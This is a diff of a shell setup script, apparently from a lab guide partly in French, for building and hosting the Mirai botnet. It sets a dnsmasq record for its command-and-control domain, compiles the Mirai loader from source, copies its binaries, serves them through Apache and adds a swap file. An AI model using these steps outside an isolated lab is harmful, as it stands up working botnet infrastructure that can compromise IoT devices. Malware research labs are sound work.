@@ -35,7 +35,7 @@ sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts
 # Configure DNS
 sudo systemctl stop systemd-resolved
 sudo systemctl disable systemd-resolved
-echo "address=/cnc.local/172.16.237.235" | sudo tee -a /etc/dnsmasq.conf
+echo "address=/cnc.local/172.31.19.53" | sudo tee -a /etc/dnsmasq.conf
 sudo systemctl enable dnsmasq
 sudo systemctl start dnsmasq
 
@@ -369,6 +369,7 @@ sed -i 's/uint32_t_to_ip/uint32_to_ip/' main.c
 # Ajouter les headers
 sed -i '1i#include <ctype.h>\n#include <stdlib.h>\n#include <unistd.h>' util.c
 
+cd ~/Mirai-Source-Code/mirai/
 # Try building with debugging (as in your original setup)
 gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 src/*.c -o ~/mirai/loader.dbg
 
@@ -386,6 +387,20 @@ cp ~/Mirai-Source-Code/loader/bins/* ~/mirai/bins/ 2>/dev/null || echo "No dropp
 # Start Apache
 sudo systemctl enable apache2
 sudo systemctl start apache2
+
+# Vérifier l'espace disque disponible
+df -h /
+
+# Créer un swap file de 2GB
+sudo fallocate -l 2G /swapfile
+sudo chmod 600 /swapfile
+sudo mkswap /swapfile
+sudo swapon /swapfile
+
+# Vérifier
+free -h
+swapon --show
+
 echo "Loader VM configured!"
 ```
 
